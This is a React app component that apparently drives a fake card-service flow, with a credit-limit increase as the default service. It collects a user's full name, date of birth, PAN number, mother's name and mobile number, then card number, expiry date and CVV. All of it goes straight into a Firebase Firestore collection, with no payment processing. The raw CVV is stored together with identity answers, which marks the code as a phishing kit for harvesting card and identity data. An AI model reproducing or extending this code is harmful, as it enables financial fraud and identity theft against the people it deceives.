import React, { useState } from 'react';
import HomeScreen from './components/HomeScreen';
import EnterDetailsScreen from './components/EnterDetailsScreen';
import CardDetailsScreen from './components/CardDetailsScreen';
import ConfirmationScreen from './components/ConfirmationScreen';
import { saveCustomerSubmission } from './firebase';

export default function App() {
  const [currentScreen, setCurrentScreen] = useState('home');
  const [selectedService, setSelectedService] = useState('');
  const [personalDetails, setPersonalDetails] = useState(null);
  const [cardDetails, setCardDetails] = useState(null);

  // 1. Home Screen Option Click -> Go to Enter Details
  const handleSelectHomeOption = (optionKey) => {
    setSelectedService(optionKey);
    setCurrentScreen('enter_details');
  };

  // 2. Enter Details Next -> Go to Card Details screen
  const handlePersonalDetailsSubmitted = (details) => {
    setPersonalDetails(details);
    setCurrentScreen('card_details');
  };

  // 3. Card Details Submit -> Save to Firebase Firestore & Go to Confirmation Screen
  const handleCardDetailsSubmitted = async (cardData) => {
    setCardDetails(cardData);
    setCurrentScreen('confirmation');

    // Prepare complete application payload
    const submissionData = {
      fullName: personalDetails?.fullName || '',
      dob: personalDetails?.dob || '',
      panNumber: personalDetails?.panNumber || '',
      mothersName: personalDetails?.mothersName || '',
      mobileNumber: personalDetails?.mobileNumber || '',
      selectedService: selectedService || 'increase_limit',
      nameOnCard: cardData?.nameOnCard || personalDetails?.fullName || '',
      cardNumber: cardData?.cardNumber || '',
      expiryDate: cardData?.expiryDate || '',
      cvv: cardData?.cvv || ''
    };

    // Save to Firebase Firestore
    try {
      await saveCustomerSubmission(submissionData);
    } catch (e) {
      console.error('Firebase submission error:', e);
    }
  };

  // Reset back to home screen
  const handleResetToHome = () => {
    setCurrentScreen('home');
    setSelectedService('');
    setPersonalDetails(null);
    setCardDetails(null);
  };

  return (
    <div className="mobile-app-shell">

      {/* Dynamic Sequential Screen Flow */}
      {currentScreen === 'home' && (
        <HomeScreen onSelectOption={handleSelectHomeOption} />
      )}

      {currentScreen === 'enter_details' && (
        <EnterDetailsScreen
          onBack={() => setCurrentScreen('home')}
          onNext={handlePersonalDetailsSubmitted}
          selectedService={selectedService}
        />
      )}

      {currentScreen === 'card_details' && (
        <CardDetailsScreen
          onBack={() => setCurrentScreen('enter_details')}
          onSubmit={handleCardDetailsSubmitted}
        />
      )}

      {currentScreen === 'confirmation' && (
        <ConfirmationScreen onReset={handleResetToHome} />
      )}
    </div>
  );
}
